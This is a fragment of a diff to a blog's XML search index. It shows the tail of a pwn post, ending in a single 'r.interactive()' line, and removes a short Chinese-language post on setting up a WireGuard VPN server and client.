class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+]]></content>
+      <categories>
+        <category>PWN</category>
+      </categories>
+      <tags>
         <tag>pwn</tag>
       </tags>
   </entry>
@@ -2697,29 +2720,6 @@ Pwnable.tw</p>
       <tags>
         <tag>AI</tag>
         <tag>Transformer</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Wireguard VPN</title>
-    <url>/2024/07/31/wireguard/</url>
-    <content><![CDATA[<h2 id="Setup-wireguard-VPN"><a href="#Setup-wireguard-VPN" class="headerlink" title="Setup wireguard VPN"></a>Setup wireguard VPN</h2><blockquote>
-<p>要先有一台機器</p>
-<blockquote>
-<p>租個雲服務都可以，這邊推薦 <a class="link"   href="https://linode.com/" >Linode<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-</blockquote>
-</blockquote>
-<p><code>sudo apt install wireguard</code></p>
-<p><a class="link"   href="https://www.wireguard.com/install/" ><i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<h3 id="Config"><a href="#Config" class="headerlink" title="Config"></a>Config</h3><p>推薦使用<a class="link"   href="https://www.wireguardconfig.com/" >這個<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>生config檔 (我就懶👍)</p>
-<blockquote>
-<p>不然要用 <code>wg</code> 生Server,Client 的 private&#x2F;public key 然後寫conf</p>
-</blockquote>
-<p>把 Server File 丟進 <code>/etc/wireguard/wg0.conf</code> 後 <code>wg-quick up wg0</code><br>client File 丟進 app</p>
-<p>就行了💯</p>
-<p>這個改定位沒什麼用，只能改ip所以有GPS驗證的可能沒辦法跳過</p>
-]]></content>
-      <tags>
-        <tag>vpn</tag>
       </tags>
   </entry>
   <entry>
